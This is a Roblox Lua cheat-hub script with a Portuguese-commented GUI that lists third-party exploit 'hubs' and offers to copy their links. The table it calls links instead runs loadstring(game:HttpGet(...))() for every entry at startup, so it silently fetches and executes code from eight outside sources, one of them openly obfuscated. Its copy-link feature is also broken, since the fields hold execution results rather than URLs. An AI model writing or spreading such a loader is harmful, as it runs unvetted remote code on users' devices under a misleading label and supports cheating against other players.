
--====================================================--
--                 PATRICK HUBS
--                    BY PATRICK
--====================================================--

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local Old = PlayerGui:FindFirstChild("PatrickHubs")
if Old then Old:Destroy() end

local BLACK = Color3.fromRGB(0, 0, 0)
local WHITE = Color3.fromRGB(255, 255, 255)
local GREY = Color3.fromRGB(45, 45, 45)

local GUI = Instance.new("ScreenGui")
GUI.Name = "PatrickHubs"
GUI.ResetOnSpawn = false
GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GUI.Parent = PlayerGui

local function Tween(obj, duration, properties, style)
    local anim = TweenService:Create(
        obj,
        TweenInfo.new(
            duration,
            style or Enum.EasingStyle.Quad,
            Enum.EasingDirection.Out
        ),
        properties
    )
    anim:Play()
    return anim
end

local function Corner(obj, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius)
    c.Parent = obj
end

local function Stroke(obj, thickness)
    local s = Instance.new("UIStroke")
    s.Color = WHITE
    s.Thickness = thickness or 1.5
    s.Parent = obj
    return s
end

local function Label(parent, text, size, position, fontSize)
    local l = Instance.new("TextLabel")
    l.Size = size
    l.Position = position
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = WHITE
    l.Font = Enum.Font.GothamBold
    l.TextSize = fontSize or 15
    l.TextWrapped = true
    l.Parent = parent
    return l
end

local function MakeButton(parent, text, size, position, fontSize)
    local b = Instance.new("TextButton")
    b.Size = size
    b.Position = position
    b.BackgroundColor3 = BLACK
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = WHITE
    b.Font = Enum.Font.GothamBold
    b.TextSize = fontSize or 15
    b.AutoButtonColor = false
    b.Parent = parent
    Corner(b, 10)
    Stroke(b, 1.5)
    return b
end

--====================================================--
-- TELA DE CARREGAMENTO
--====================================================--

local Loading = Instance.new("Frame")
Loading.Name = "Loading"
Loading.AnchorPoint = Vector2.new(0.5, 0.5)
Loading.Position = UDim2.new(0.5, 0, 0.5, 0)
Loading.Size = UDim2.fromOffset(1, 1)
Loading.BackgroundColor3 = BLACK
Loading.BorderSizePixel = 0
Loading.ClipsDescendants = true
Loading.ZIndex = 20
Loading.Parent = GUI
Corner(Loading, 18)
Stroke(Loading, 2)

local LoadTitle = Label(
    Loading,
    "Patrick-Hubs",
    UDim2.new(1, -20, 0, 45),
    UDim2.fromOffset(10, 40),
    25
)
LoadTitle.ZIndex = 21

local LoadText = Label(
    Loading,
    "Loading Patrick Hub. Please wait...",
    UDim2.new(1, -25, 0, 40),
    UDim2.fromOffset(12, 90),
    12
)
LoadText.ZIndex = 21

local Bar = Instance.new("Frame")
Bar.Size = UDim2.new(1, -50, 0, 8)
Bar.Position = UDim2.new(0, 25, 1, -35)
Bar.BackgroundColor3 = GREY
Bar.BorderSizePixel = 0
Bar.ZIndex = 21
Bar.Parent = Loading
Corner(Bar, 8)

local Fill = Instance.new("Frame")
Fill.Size = UDim2.new(0, 0, 1, 0)
Fill.BackgroundColor3 = WHITE
Fill.BorderSizePixel = 0
Fill.ZIndex = 22
Fill.Parent = Bar
Corner(Fill, 8)

--====================================================--
-- JANELA PRINCIPAL
--====================================================--

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.fromOffset(330, 430)
Main.Position = UDim2.new(0.5, -165, 0.5, -215)
Main.BackgroundColor3 = BLACK
Main.BorderSizePixel = 0
Main.Visible = false
Main.Parent = GUI
Corner(Main, 18)
Stroke(Main, 2)

local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 58)
Header.BackgroundTransparency = 1
Header.Parent = Main

local Title = Label(
    Header,
    "Patrick-Hubs",
    UDim2.new(1, -105, 1, 0),
    UDim2.fromOffset(15, 0),
    20
)
Title.TextXAlignment = Enum.TextXAlignment.Left

local Minimize = MakeButton(
    Header, "-", UDim2.fromOffset(36, 36),
    UDim2.new(1, -83, 0, 10), 24
)

local Close = MakeButton(
    Header, "X", UDim2.fromOffset(36, 36),
    UDim2.new(1, -42, 0, 10), 16
)

--====================================================--
-- CATEGORIAS
--====================================================--

local NoKey = MakeButton(
    Main, "Script No Key",
    UDim2.new(0.5, -15, 0, 34),
    UDim2.fromOffset(10, 62), 12
)

local KeySystem = MakeButton(
    Main, "Script Key System",
    UDim2.new(0.5, -15, 0, 34),
    UDim2.new(0.5, 5, 0, 62), 12
)

local Scroll = Instance.new("ScrollingFrame")
Scroll.Size = UDim2.new(1, -20, 1, -115)
Scroll.Position = UDim2.fromOffset(10, 105)
Scroll.BackgroundTransparency = 1
Scroll.BorderSizePixel = 0
Scroll.ScrollBarThickness = 4
Scroll.ScrollBarImageColor3 = WHITE
Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
Scroll.CanvasSize = UDim2.new()
Scroll.Parent = Main

local Layout = Instance.new("UIListLayout")
Layout.Padding = UDim.new(0, 9)
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
Layout.Parent = Scroll

--====================================================--
-- HUBS E LINKS PARA CONSULTA
--====================================================--

local Hubs = {
    {
        name = "Small Serve",
        category = "Key System",
        url = loadstring(game:HttpGet("https://raw.githubusercontent.com/dertonware/scriptasda/refs/heads/main/scriptlua",true))()
    },
    {
        name = "Anti Hit Wzeu",
        category = "No Key",
        url = loadstring(game:HttpGet("https://raw.githubusercontent.com/Wzeus-NTH/Wzeusno1/main/Wzeus/nthzz"))()
    },
    {
        name = "Pulse Hub",
        category = "No Key",
        url = loadstring(game:HttpGet("https://raw.githubusercontent.com/PulseZax/Loader/refs/heads/main/.lua"))()
    },
    {
        name = "Ajjans Hub",
        category = "Key System",
        url = loadstring(game:HttpGet("https://raw.githubusercontent.com/virtuososvisualedits-prog/Ww/refs/heads/main/final-obfuscated.lua"))()
    },
    {
        name = "Miranda Hub",
        category = "No Key",
        url = loadstring(game:HttpGet("https://raw.githubusercontent.com/miirandahub/loader/refs/heads/main/afkk"))()
    },
    {
        name = "Fyy Community",
        category = "Key System",
        url = loadstring(game:HttpGet("https://FyyCommunity.my.id"))()
    },
    {
        name = "Chilli Hub",
        category = "No Key",
        url = loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/Chilli-Hub-Script/refs/heads/main/StealAnEgg"))()
    },
    {
        name = "Night Hub",
        category = "No Key",
        url = loadstring(game:HttpGet("https://raw.githubusercontent.com/WhiteX1208/Scripts/refs/heads/main/StealEggOnly.luau"))()
    }
}

local CurrentCategory = "No Key"

local function Refresh()
    for _, child in ipairs(Scroll:GetChildren()) do
        if child:IsA("GuiObject") and child ~= Layout then
            child:Destroy()
        end
    end

    for _, hub in ipairs(Hubs) do
        if hub.category == CurrentCategory then
            local Card = Instance.new("Frame")
            Card.Size = UDim2.new(1, -8, 0, 72)
            Card.BackgroundColor3 = BLACK
            Card.BorderSizePixel = 0
            Card.Parent = Scroll
            Corner(Card, 12)
            Stroke(Card, 1.5)

            local Name = Label(
                Card, hub.name,
                UDim2.new(1, -20, 0, 28),
                UDim2.fromOffset(10, 4), 16
            )
            Name.TextXAlignment = Enum.TextXAlignment.Left

            local Desc = Label(
                Card, hub.category,
                UDim2.new(1, -105, 0, 22),
                UDim2.fromOffset(10, 37), 11
            )
            Desc.TextXAlignment = Enum.TextXAlignment.Left

            local View = MakeButton(
                Card, "VER LINK",
                UDim2.fromOffset(88, 30),
                UDim2.new(1, -98, 0, 21), 10
            )

            View.Activated:Connect(function()
                local copied = false
                if setclipboard then
                    copied = pcall(setclipboard, hub.url)
                end

                if copied then
                    View.Text = "COPIADO!"
                else
                    View.Text = "LINK NO CÓDIGO"
                    warn("[Patrick-Hubs] Link de " .. hub.name .. ": " .. hub.url)
                end

                task.delay(1.5, function()
                    if View.Parent then
                        View.Text = "VER LINK"
                    end
                end)
            end)
        end
    end
end

NoKey.Activated:Connect(function()
    CurrentCategory = "No Key"
    Tween(NoKey, 0.1, {BackgroundColor3 = GREY})
    Tween(KeySystem, 0.1, {BackgroundColor3 = BLACK})
    Refresh()
end)

KeySystem.Activated:Connect(function()
    CurrentCategory = "Key System"
    Tween(KeySystem, 0.1, {BackgroundColor3 = GREY})
    Tween(NoKey, 0.1, {BackgroundColor3 = BLACK})
    Refresh()
end)

--====================================================--
-- ARRASTAR JANELA
--====================================================--

local function MakeDraggable(object, handle)
    local dragging = false
    local startInput
    local startPosition

    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            startInput = input.Position
            startPosition = object.Position
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if dragging and (
            input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch
        ) then
            local delta = input.Position - startInput
            object.Position = UDim2.new(
                startPosition.X.Scale,
                startPosition.X.Offset + delta.X,
                startPosition.Y.Scale,
                startPosition.Y.Offset + delta.Y
            )
        end
    end)

    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end

MakeDraggable(Main, Header)

--====================================================--
-- BOLHA PH
--====================================================--

local Bubble = MakeButton(
    GUI, "PH",
    UDim2.fromOffset(58, 58),
    UDim2.new(0.5, -29, 0.5, -29), 19
)
Bubble.Name = "Bubble"
Bubble.BackgroundTransparency = 0.3
Bubble.Visible = false
Corner(Bubble, 999)

MakeDraggable(Bubble, Bubble)

Minimize.Activated:Connect(function()
    Main.Visible = false
    Bubble.Visible = true
    Bubble.Size = UDim2.fromOffset(0, 0)
    Tween(Bubble, 0.22, {
        Size = UDim2.fromOffset(58, 58)
    }, Enum.EasingStyle.Back)
end)

Bubble.Activated:Connect(function()
    Bubble.Visible = false
    Main.Visible = true
    Main.Size = UDim2.fromOffset(1, 1)
    Tween(Main, 0.3, {
        Size = UDim2.fromOffset(330, 430)
    }, Enum.EasingStyle.Back)
end)

Close.Activated:Connect(function()
    local anim = Tween(Main, 0.16, {
        Size = UDim2.fromOffset(1, 1)
    })
    anim.Completed:Wait()
    GUI:Destroy()
end)

--====================================================--
-- INICIAR ANIMAÇÃO
--====================================================--

Refresh()
NoKey.BackgroundColor3 = GREY

task.spawn(function()
    Tween(Loading, 0.45, {
        Size = UDim2.fromOffset(330, 200)
    }, Enum.EasingStyle.Back)

    Tween(Fill, 2.3, {
        Size = UDim2.new(1, 0, 1, 0)
    })

    task.wait(2.4)

    if not GUI.Parent then return end

    local closing = Tween(Loading, 0.22, {
        Size = UDim2.fromOffset(1, 1)
    })
    closing.Completed:Wait()

    if not GUI.Parent then return end

    Loading:Destroy()
    Main.Visible = true
    Main.Size = UDim2.fromOffset(1, 1)

    Tween(Main, 0.35, {
        Size = UDim2.fromOffset(330, 430)
    }, Enum.EasingStyle.Back)
end)

print("Patrick-Hubs carregado!")
